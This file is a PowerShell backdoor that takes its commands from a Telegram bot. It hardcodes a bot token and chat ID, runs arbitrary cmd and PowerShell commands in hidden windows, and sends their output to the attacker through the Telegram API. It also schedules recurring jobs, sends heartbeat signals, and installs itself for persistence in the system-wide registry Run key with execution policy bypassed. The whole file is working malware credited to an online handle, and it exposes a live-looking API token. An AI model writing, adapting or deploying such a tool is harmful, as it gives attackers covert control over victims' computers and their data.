$token = "8189296418:AAExUFzaL9z2BYQRvoNxOjWJtGrgu3N_sWo"  
$chatId = "1562460007"  
$aliveInterval = 2  
$runningProcess = $null  
$command = ""  
$debugLogs = @()  
$jobs = @{}

function Send-TelegramMessage {  
    param([string]$message)  
    $messageWithCopyright = "$message`n--------{Made By @CodedNexus}-----"
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$messageWithCopyright"  
    try {  
        Invoke-RestMethod -Uri $url -Method Get  
    }  
    catch {  
        Log-DebugMessage "Error sending message: $_"  
    }  
}  

function Log-DebugMessage {  
    param([string]$message)  
    Write-Host "[$(Get-Date -Format "yyyy-MM-dd HH:mm:ss")] $message"  
    $debugLogs += "[$(Get-Date -Format "yyyy-MM-dd HH:mm:ss")] $message"  
}  

function Send-DebugLogs {  
    if ($debugLogs.Count -gt 0) {  
        $debugMessage = $debugLogs -join "`n"  
        Send-TelegramMessage "Debug logs:`n$debugMessage"  
        $debugLogs.Clear()  
    }  
}  

function Get-TelegramUpdates {  
    $url = "https://api.telegram.org/bot$token/getUpdates"  
    try {  
        Log-DebugMessage "Fetching Telegram updates..."  
        $response = Invoke-RestMethod -Uri $url -Method Get  
        Log-DebugMessage "Received response: $($response | ConvertTo-Json)"  
        if ($response.result.Count -gt 0) {  
            $command = $response.result[-1].message.text  
            if ($command -notmatch "^/") {  
                return  
            }  
            Log-DebugMessage "Received command: $command"  
            Send-TelegramMessage "Command received: $command"  
        }  
    }  
    catch {  
        Log-DebugMessage "Error getting updates: $_"  
    }  
}  

function Execute-Command {  
    param([string]$command)  
    try {  
        Log-DebugMessage "Executing command: $command"  
        $processStartTime = Get-Date  
        $process = Start-Process cmd.exe -ArgumentList "/C $command" -NoNewWindow -WindowStyle Hidden -PassThru  
        $processOutput = $process.StandardOutput  
        $processError = $process.StandardError  

        while (!$process.HasExited) {  
            if ($processOutput.Peek()) {  
                $line = $processOutput.ReadLine()  
                Send-TelegramMessage $line  
                Log-DebugMessage "Output: $line"  
            }  
            if ($processError.Peek()) {  
                $line = $processError.ReadLine()  
                Send-TelegramMessage "Error: $line"  
                Log-DebugMessage "Error: $line"  
            }  
            Start-Sleep -Milliseconds 200  
        }  

        $processExitCode = $process.ExitCode  
        $processEndTime = Get-Date  
        Log-DebugMessage "Command executed in $($processEndTime - $processStartTime). Exit code: $processExitCode"  
        if ($processExitCode -ne 0) {  
            Log-DebugMessage "Command failed with exit code $processExitCode"  
        }  
    }  
    catch {  
        Log-DebugMessage "Error executing command: $_"  
    }  
}  

function Execute-PowerShellCommand {  
    param([string]$command)  
    try {  
        Log-DebugMessage "Executing PowerShell command: $command"  
        $processStartTime = Get-Date  
        $process = Start-Process powershell.exe -ArgumentList "-Command $command" -NoNewWindow -WindowStyle Hidden -PassThru  
        $processOutput = $process.StandardOutput  
        $processError = $process.StandardError  

        while (!$process.HasExited) {  
            if ($processOutput.Peek()) {  
                $line = $processOutput.ReadLine()  
                Send-TelegramMessage $line  
                Log-DebugMessage "Output: $line"  
            }  
            if ($processError.Peek()) {  
                $line = $processError.ReadLine()  
                Send-TelegramMessage "Error: $line"  
                Log-DebugMessage "Error: $line"  
            }  
            Start-Sleep -Milliseconds 200  
        }  

        $processExitCode = $process.ExitCode  
        $processEndTime = Get-Date  
        Log-DebugMessage "PowerShell command executed in $($processEndTime - $processStartTime). Exit code: $processExitCode"  
        if ($processExitCode -ne 0) {  
            Log-DebugMessage "PowerShell command failed with exit code $processExitCode"  
        }  
    }  
    catch {  
        Log-DebugMessage "Error executing PowerShell command: $_"  
    }  
}  

function Stop-RunningCommand {  
    if ($runningProcess -ne $null) {  
        $runningProcess.Kill()  
        Log-DebugMessage "Running command stopped."  
        Send-TelegramMessage "Running command stopped."  
    }  
}  

function Send-AliveSignal {  
    $message = "I am alive!"  
    Send-TelegramMessage $message  
    Log-DebugMessage "Alive signal sent: $message"  
}  

function Start-Job {  
    param([string]$command, [int]$diff, [int]$timeInMinutes, [string]$debug, [string]$jobName = $null)  
    if (-not $jobName) {  
        $jobName = "Job_$((Get-Date).ToString('yyyyMMddHHmmss'))"  
    }
    $endTime = (Get-Date).AddMinutes($timeInMinutes)  
    $jobs[$jobName] = @{  
        Command = $command  
        Diff = $diff  
        EndTime = $endTime  
        Debug = $debug  
    }  
    Log-DebugMessage "Started job: $jobName for command '$command', every $diff minute(s), ending at $endTime."
    
    while ((Get-Date) -lt $endTime) {  
        if ($debug -eq "yes") {  
            Send-TelegramMessage "Executing job: $command"  
        }  
        # Execute the command in a hidden CMD window and capture the output
        $process = Start-Process cmd.exe -ArgumentList "/C $command" -NoNewWindow -WindowStyle Hidden -PassThru
        $process.WaitForExit()  # Wait for the process to exit

        # Read the output of the command
        $output = $process.StandardOutput.ReadToEnd()
        if ($output) {
            Send-TelegramMessage $output
            Log-DebugMessage "Command output: $output"
        }

        # Capture errors if any
        $errorOutput = $process.StandardError.ReadToEnd()
        if ($errorOutput) {
            Send-TelegramMessage "Error: $errorOutput"
            Log-DebugMessage "Error: $errorOutput"
        }

        # Optionally send an exit message
        $processExitCode = $process.ExitCode
        if ($processExitCode -ne 0) {
            Log-DebugMessage "Command failed with exit code $processExitCode"
        }

        # Sleep for the defined interval
        Start-Sleep -Minutes $diff  
    }  
    $jobs.Remove($jobName)  
    Send-TelegramMessage "Job $jobName completed."  
    Log-DebugMessage "Job $jobName completed."  
}

function List-Jobs {  
    if ($jobs.Count -gt 0) {  
        $jobList = $jobs.GetEnumerator() | ForEach-Object {  
            "$($_.Key) -> Command: $($_.Value.Command), EndTime: $($_.Value.EndTime)"  
        }  
        Send-TelegramMessage "Active jobs:`n$($jobList -join "`n")"  
    }  
    else {  
        Send-TelegramMessage "No active jobs."  
    }  
}  

function Close-Job {  
    param([string]$jobName)  
    if ($jobs.ContainsKey($jobName)) {  
        $jobs.Remove($jobName)  
        Send-TelegramMessage "Job $jobName closed."  
        Log-DebugMessage "Job $jobName closed."  
    }  
    else {  
        Send-TelegramMessage "Job $jobName not found."  
    }  
}

# Add /help command
function Show-Help {  
    $helpMessage = @"
    Available Commands:
    - /cmd <command>       : Executes the given command in CMD and returns output.
    - /pws <command>       : Executes the given PowerShell command and returns output.
    - /alive <minutes>     : Set the interval to send alive signal (in minutes).
    - /stop                : Stop the currently running command.
    - /exit                : Stop the script.
    - /job <command> <interval> <duration> <debug> <jobName> : Start a recurring job.
    - /job list            : Lists all active jobs.
    - /jclose <jobName>    : Close a specific job.
    - /help                : Show this help message.
"@
    Send-TelegramMessage $helpMessage
}

# Main loop to handle updates
while ($true) {  
    Log-DebugMessage "Checking for Telegram updates..."  
    Get-TelegramUpdates  

    if ($command -eq "stop") {  
        Stop-RunningCommand  
    }  
    elseif ($command -eq "/exit") {  
        Send-TelegramMessage "Application stopped."  
        Log-DebugMessage "Application stopped by user."  
        break  
    }  
    elseif ($command -match "^/alive (\d+)$") {  
        $minutes = [int]$matches[1]  
        $aliveInterval = $minutes  
        Send-TelegramMessage "Alive interval updated."  
        Log-DebugMessage "Alive interval updated to $aliveInterval minutes."  
    }  
    elseif ($command -match "^/cmd (.+)$") {  
        $commandToExecute = $matches[1]  
        Execute-Command $commandToExecute  
    }  
    elseif ($command -match "^/pws (.+)$") {  
        $powerShellCommand = $matches[1]  
        Execute-PowerShellCommand $powerShellCommand  
    }  
    elseif ($command -match "^/job (\S+) (\d+) (\d+) (yes|no)(?: (\S+))?$") {  
        $commandToRun = $matches[1]  
        $interval = [int]$matches[2]  
        $timeInMinutes = [int]$matches[3]  
        $debugOption = $matches[4]  
        $customJobName = $matches[5]  
        Start-Job $commandToRun $interval $timeInMinutes $debugOption $customJobName  
    }  
    elseif ($command -eq "/job list") {  
        List-Jobs  
    }  
    elseif ($command -match "^/jclose (\S+)$") {  
        $jobName = $matches[1]  
        Close-Job $jobName  
    }  
    elseif ($command -eq "/help") {  
        Show-Help  
    }  
    else {  
        Send-TelegramMessage "Unknown command."  
    }  

    $currentTime = Get-Date  
    if (($currentTime - $lastAliveTime).TotalMinutes -ge $aliveInterval) {  
        Send-AliveSignal  
        $lastAliveTime = $currentTime  
    }  

    Start-Sleep -Milliseconds 500  
}  

$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"  
$scriptArgs = "`"$scriptPath`""  
$regKey = "powershell.exe -ExecutionPolicy Bypass -File $scriptArgs"  

Log-DebugMessage "Attempting to add script to system-wide startup..."  

if (-not (Test-Path "$regPath\$scriptName")) {  
    Set-ItemProperty -Path $regPath -Name $scriptName -Value $regKey  
    Log-DebugMessage "Script added to system-wide startup."  
    Send-TelegramMessage "Script added to system-wide startup!"  
} else {  
    Log-DebugMessage "Script already in startup registry."  
}  

Send-DebugLogs
